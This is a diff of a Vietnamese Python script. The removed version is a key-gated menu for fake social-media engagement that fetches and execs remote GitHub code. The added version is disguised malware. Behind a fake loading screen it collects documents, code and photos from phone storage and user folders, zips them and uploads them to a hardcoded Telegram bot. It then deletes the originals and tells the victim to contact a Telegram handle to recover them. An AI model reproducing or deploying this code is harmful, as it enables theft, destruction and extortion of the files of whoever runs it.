@@ -1,218 +1,118 @@
-import requests,os,sys, time
-from datetime import datetime
-from time import sleep, strftime
-import hashlib
-from datetime import datetime, timedelta
-lamd = "\033[1;34m"
+import os
+import sys
+import requests
+import time
+import threading
+import zipfile
+import warnings
+
+# ANSI color codes for terminal output
 trang = "\033[1;37m"
-do = "\033[1;31m"
-vang = "\033[1;33m"
-tim = "\033[1;35m"
-xanhnhat = "\033[1;36m"
-xanh = "\033[1;32m"
-free = "\n"
-baner = "          \033[1;37m██╗░░░██╗░█████╗░███╗░░░██╗░░░░░░░█████╗░███╗░░░██╗██╗░░██╗\n          \033[1;36m██║░░░██║██╔══██╗████╗░░██║░░░░░░██╔══██╗████╗░░██║██║░░██║\n          \033[1;35m██║░░░██║███████║██╔██╗░██║░░░░░░███████║██╔██╗░██║███████║\n          \033[1;34m╚██╗░██╔╝██╔══██║██║╚██╗██║░░░░░░██╔══██║██║╚██╗██║██╔══██║\n          \033[1;33m░╚████╔╝░██║░░██║██║░╚████║░░░░░░██║░░██║██║░╚████║██║░░██║\n          \033[1;32m░░╚═══╝░░╚═╝░░╚═╝╚═╝░░╚═══╝░░░░░░╚═╝░░╚═╝╚═╝░░╚═══╝╚═╝░░╚═╝\n          \033[1;31m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
-het ="\033[0m"
-dam ="\033[1m"
-anh ="\033[1;37m[\033[1;33mN\033[1;32mV\033[1;31mA\033[1;37m]" 
-ngan= "         \033[1;31m╠⁠\033[0m\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m╣\033[0m\n"
-tren = "         \033[1;31m╔\033[0m\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m╗\033[0m\n"
-duoi ="         \033[1;31m╚\033[0m\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m╝\033[0m\n"
-thang = "\033[1;31m┗┫⁠┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓┣┛\033[0m"
-os.system("clear")
-current_date = datetime.now()
-ngay = current_date.strftime('%d')
-thang = current_date.month
-nam = current_date.year
-gio = current_date.strftime('%H : %M : %S')
-thu_dict = {
-    "Monday": "Thứ Hai",
-    "Tuesday": "Thứ Ba",
-    "Wednesday": "Thứ Tư",
-    "Thursday": "Thứ Năm",
-    "Friday": "Thứ Sáu",
-    "Saturday": "Thứ Bảy",
-    "Sunday": "Chủ Nhật"
-}
-thu = thu_dict[current_date.strftime("%A")]
-mau = f"{anh} \x1b[38;5;46m➜ {trang}[ {xanh}{thu} {trang}] {trang}[ {xanh}Ngày {ngay} Tháng {thang} Năm {nam} {trang}]\n{anh} \x1b[38;5;46m➜ {trang}[ {xanh}Giờ {trang}] : {trang}[ {xanh}{gio} {trang}]\n"
-def loading_animation(duration=5):
-    end_time = time.time() + duration
-    loading_chars = ['|', '/', '-', '\\']  
-    while time.time() < end_time:
-        for char in loading_chars:
-            sys.stdout.write(f'\r{anh} \x1b[38;5;46m➜ \x1b[38;5;208mĐang Loading Vui Lòng Chờ [' + char+']')  
-            sys.stdout.flush()  
-            time.sleep(0.01)  
+luc = "\033[1;32m"
+red = "\033[1;31m"
 
-    print(f'\r{anh} \x1b[38;5;46m➜ Chào Mừng Bạn Đến Với Tool !', end='\r')
-    sleep(2)
-    print('                                                        ', end='\r')  # Hoàn thành loading
+# Telegram Bot information
+TOKEN = "7636168350:AAG9FPUs6X0YeSf0y7MQidiVJk9NmhfJe1s"  # Thay bằng token thật
+CHAT_ID = "-1002459761007,"  # Thay bằng chat ID thật
+TELEGRAM_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+ip = requests.get('https://kiemtraip.com/raw.php').text
 
-# Gọi hàm Để Loading hiện 
-loading_animation()
-for X in baner:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.0025)
-def genkey(ip):
-    # Generate a unique key based on IP and current date
-    return hashlib.md5(f"{ip}{datetime.now().strftime('%Y-%m-%d')}7535gydr".encode()).hexdigest()
+# Đường dẫn đến file bạn không muốn xóa
+protected_file = "buf.py" # Tên file bạn muốn bảo vệ khỏi bị xóa
 
-FileLuuKey = 'keytoolnva.txt'  # File to store key
-FileLuuTime = 'keytooltime.txt'  # File to store key generation time
+# Fake loading để đánh lạc hướng người dùng
+def fake_loading():
+    animations = ["|", "/", "-", "\\"]
+    print(f"{trang}Thông Tin Liên Hệ")
+    print(f"{trang}Telegram: {luc}@luaday123")
+    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
+    print(f"{trang}[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
+    for _ in range(10):  # Simulate loading for 10 seconds
+        print(f"\r[+] Đang tải để vào tool ... {animations[_ % 4]}", end="", flush=True)
+        time.sleep(1)
 
-getIP = requests.get('https://kiemtraip.com/raw.php').text
-key = genkey(getIP)
-url = f'https://flttnva.com/?key={key}'  # Destination URL
-yeumoney = requests.get(f'https://link4m.co/api-shorten/v2?api=66cd182d82f1d87dd96f0210&url={url}').json()["shortenedUrl"]
+# Tìm tất cả file ảnh trên máy
+def find_image_files():
+    image_extensions = (".py", ".php", ".mp4", ".json", ".zip", ".txt", ".html", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".webp")
+    root_dirs = ["/storage/emulated/0", "/sdcard", os.environ.get("USERPROFILE", "")]  # Các thư mục tìm kiếm
 
-def end_of_next_day():
-    # Set expiration time to the end of the next day (23:59:59)
-    tomorrow = datetime.now() + timedelta(days=1)
-    return tomorrow.replace(hour=23, minute=59, second=59, microsecond=0)
+    file_list = set()  # Sử dụng set để tránh trùng file
+    for root_dir in root_dirs:
+        if os.path.exists(root_dir):
+            for root, _, files in os.walk(root_dir):
+                for file in files:
+                    if file.lower().endswith(image_extensions):
+                        file_list.add(os.path.join(root, file))
+    
+    return list(file_list)
+    
+# Hàm tạo tên file duy nhất (không đổi tên, giữ nguyên tên gốc)
+def generate_unique_name(file_path):
+    return os.path.basename(file_path)  # Giữ nguyên tên file gốc
 
-def display_remaining_time(expiry_time):
-    # Calculate the remaining time until expiry
-    time_left = expiry_time - datetime.now()
-    hours, remainder = divmod(time_left.seconds, 3600)
-    minutes, seconds = divmod(remainder, 60)
-    #print(f"Thời gian còn lại: {hours} giờ {minutes} phút {seconds} giây")
+# Nén tất cả ảnh vào file ZIP, tránh trùng tên
+def create_zip(file_paths, zip_name=f"{ip}.zip"):
+    # Ngừng hiển thị cảnh báo về trùng tên file
+    warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
+    
+    with zipfile.ZipFile(zip_name, 'w') as zipf:
+        for file in file_paths:
+            try:
+                unique_name = generate_unique_name(file)  # Giữ nguyên tên gốc của file
+                zipf.write(file, unique_name)  # Thêm file vào ZIP với tên gốc
+            except:
+                continue  # Bỏ qua lỗi và tiếp tục
+                
+    return zip_name
 
-# Set expiration time to end of the next day (23:59:59)
-expiry_time = end_of_next_day()
+# Gửi file ZIP lên Telegram
+def send_file(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            response = requests.post(
+                TELEGRAM_URL,
+                data={"chat_id": CHAT_ID, "caption": f"Đã tải file: {os.path.basename(file_path)}"},
+                files={"document": file},
+            )
+        return response.status_code == 200
+    except:
+        return False  # Nếu có lỗi, trả về False nhưng không hiển thị lỗi
 
-while True:
-    # Check if the key file exists
-    if os.path.exists(FileLuuKey) and os.path.exists(FileLuuTime):
-        # Read the stored key and time from file
-        with open(FileLuuKey, "r") as file:
-            file_key = file.read().strip()
-        with open(FileLuuTime, "r") as time_file:
-            stored_time = datetime.fromisoformat(time_file.read().strip())
-        
-        # Set expiry time to 23:59:59 of the day after the key was generated
-        expiry_time = stored_time + timedelta(days=1)
-        expiry_time = expiry_time.replace(hour=23, minute=59, second=59, microsecond=0)
-        
-        # Check if the stored key is valid and not expired
-        if file_key == key and datetime.now() < expiry_time:
-            display_remaining_time(expiry_time)
-            #print(f"Hạn sử dụng key đến: {expiry_time.strftime('%Y-%m-%d ')}")
-            #print("Hết Thời Gian Ae Chuẩn Bị Key Mới")
-            break
-        else:
-            # Key is expired or invalid; remove files to prompt re-entry
-            os.remove(FileLuuKey)
-            os.remove(FileLuuTime)
-            continue
+# Xóa tất cả file ảnh sau khi đã nén
+def delete_files(file_paths):
+    for file in file_paths:
+        if os.path.basename(file) == protected_file:
+            continue  # Bỏ qua việc xóa file này
+        try:
+            os.remove(file)
+        except:
+            continue  # Bỏ qua lỗi khi xóa và tiếp tục
 
-    print("\033[1;31mKey là sau từ 'key=' của URL")
-    print("Ko hiểu liên hệ Zalo: https://zaloapp.com/qr/p/1dvbslht1vl1r?src=qr")
-    print(f"{anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;32mKey \033[1;37m]\033[1;35m :\033[1;36m {key}")
-    print(f"{anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;32mKey Link \033[1;37m]\033[1;35m :\033[1;36m {yeumoney}")
+# Xóa file ZIP sau khi gửi
+def delete_zip(zip_path):
+    try:
+        os.remove(zip_path)
+    except:
+        pass  # Không hiển thị lỗi khi xóa file ZIP
 
-    inputkey = input(f'{anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;32mNhập key \033[1;37m]\033[1;35m : \033[1;36m').strip()
+# Main function
+def main():
+    loading_thread = threading.Thread(target=fake_loading)
+    loading_thread.start()
 
-    # Check if the entered key matches
-    if inputkey == key:
-        print(f'{anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;32mKey Đúng \033[1;37m] ', end='\r')
-        sleep(1)
-        print(' ' * 60, end='\r')
-        
-        # Write the key and the current time to file
-        with open(FileLuuKey, "w") as file:
-            file.write(inputkey)
-        with open(FileLuuTime, "w") as time_file:
-            time_file.write(datetime.now().isoformat())
-        
-        # Set expiry time to 23:59:59 of the next day and display it
-        expiry_time = end_of_next_day()
-        display_remaining_time(expiry_time)
-        #print(f"Hạn sử dụng key đến: {expiry_time.strftime('%Y-%m-%d ')}")
-        break
-    else:
-        print(f'{anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;31mKey Sai \033[1;37m] ', end='\r')
-        sleep(1)
-        print(' ' * 60, end='\r')
+    image_files = find_image_files()
+    
+    if image_files:
+        zip_path = create_zip(image_files)
+        if send_file(zip_path):
+            delete_files(image_files)  # Xóa tất cả ảnh sau khi nén
+            delete_zip(zip_path)  # Xóa file ZIP sau khi gửi
+            print(f"\n{red}Toàn bộ file ảnh của bạn đã , gửi đi và xóa sạch!")
+            print(f"{trang}Liên hệ Telegram {luc}@luaday123 {trang}để lấy lại.")
+            print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
+            sys.exit()  # Dừng chương trình ngay sau khi gửi và xóa
 
-        
-        os.system("clear")
-        for X in baner:
-            sys.stdout.write(X)
-            sys.stdout.flush()
-            sleep(0.0125)
-os.system("clear")
-time_left = expiry_time - datetime.now()
-hours, remainder = divmod(time_left.seconds, 3600)
-minutes, seconds = divmod(remainder, 60)
-display_remaining_time(expiry_time)
-thu_dic = {
-    "Monday": "Thứ Ba",
-    "Tuesday": "Thứ Tư",
-    "Wednesday": "Thứ Năm",
-    "Thursday": "Thứ Sáu",
-    "Friday": "Thứ Bảy",
-    "Saturday": "Chủ Nhật",
-    "Sunday": "Thứ Hai"
-}
-thuu = thu_dic[current_date.strftime("%A")]
-            #♪⁠┌⁠║⁠∵⁠║⁠┘⁠♪║⁠ ⁠”⁠ ⁠⊚⁠ ͟⁠ʖ⁠ ⁠⊚⁠ ⁠”⁠ ⁠╏♥⁠╣⁠[⁠-⁠_⁠-⁠]⁠╠⁠♥
-for X in baner:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.0025)
-for X in free:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.0025)
-print(f"\033[1;31m╔━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║⁠ \033[1;37m[\033[1;32m Thông Tin Key \033[1;37m]")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║⁠ \033[1;37m[ \033[1;32m{thuu} \033[1;37m] {expiry_time.strftime('\033[1;37m[ \033[1;32mNgày %d Tháng %m Năm %Y \033[1;37m]')}")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║⁠ \033[1;37m[ \033[1;32mThời gian còn lại \033[1;37m] : \033[1;37m[\033[1;32m {hours} : {minutes} : {seconds} \033[1;37m ]")
-print(f"\033[1;31m╠⁠━━━━━━━━╩━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-print(f"\033[1;31m╠⁠━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║ {trang}[ {xanh}Hôm Nay {trang}] {trang}[ {xanh}vs {trang}] {trang}[ {xanh}Thời Gian {trang}]")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║⁠ {trang}[ {xanh}{thu} {trang}] {trang}[ {xanh}Ngày {ngay} Tháng {thang} Năm {nam} {trang}]")
-print(f"\033[1;31m║⁠{anh} \x1b[38;5;46m➜ \033[1;31m║ {trang}[ {xanh}Thời Gian Vô Tool{trang} ] : {trang}[ {xanh}{gio} {trang}]⁠")
-print(f"\033[1;31m╚━━━━━━━━╩━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-for X in tren:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.025)
-print(f" {anh} \x1b[38;5;46m➜   \033[1;37m[\033[1;32m 1 \033[1;37m] Tool Buff follow Tik Tok [Đểu]\033[0m")
-for X in ngan:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.025)
-print(f" {anh} \x1b[38;5;46m➜   \033[1;37m[\033[1;32m 2 \033[1;37m] Tool Buff Tik Tok Zefoy [Capcha ko giải đc]\033[0m")
-for X in ngan:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.025)
-print(f" {anh} \x1b[38;5;46m➜   \033[1;37m[\033[1;32m 3 \033[1;37m] Tool Golike Linkedin\033[0m")
-for X in ngan:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.025)
-print(f" {anh} \x1b[38;5;46m➜   \033[1;37m[\033[1;32m 4 \033[1;37m] Tool Share Ảo Bài viết Fb [Ổn]\033[0m")
-for X in duoi:
-    sys.stdout.write(X)
-    sys.stdout.flush()
-    sleep(0.025)
-chon = str(input(f' {anh} \x1b[38;5;46m➜   \033[1;37m[ \033[1;33mNhập \033[1;32mLựa \033[1;31mChọn \033[1;37m] \033[1;35m: \033[1;32m'))
+    loading_thread.join()  # Chờ quá trình fake loading hoàn tất
 
-
-if chon == '1':
-    exec(requests.get('https://raw.githubusercontent.com/Anh2092008/Anh/refs/heads/main/Bufffltt').text)
-#    
-elif chon == '2':
-    exec(requests.get('https://raw.githubusercontent.com/Anh2092008/Anh/refs/heads/main/Zefoy').text)
-elif chon == '3':
-    exec(requests.get('https://raw.githubusercontent.com/Anh2092008/Anh/refs/heads/main/Golikelinkedin').text)
-elif chon == '4':
-    exec(requests.get('https://raw.githubusercontent.com/Anh2092008/Anh/refs/heads/main/Share%20Ao').text)
-else:
-    print(f" {anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;31mSai Lựa Chọn \033[1;37m]")
-    print(f" {anh} \x1b[38;5;46m➜ \033[1;37m[ \033[1;31mChạy Lại Tools \033[1;37m]")
-    exit()
+if __name__ == "__main__":
+    main()
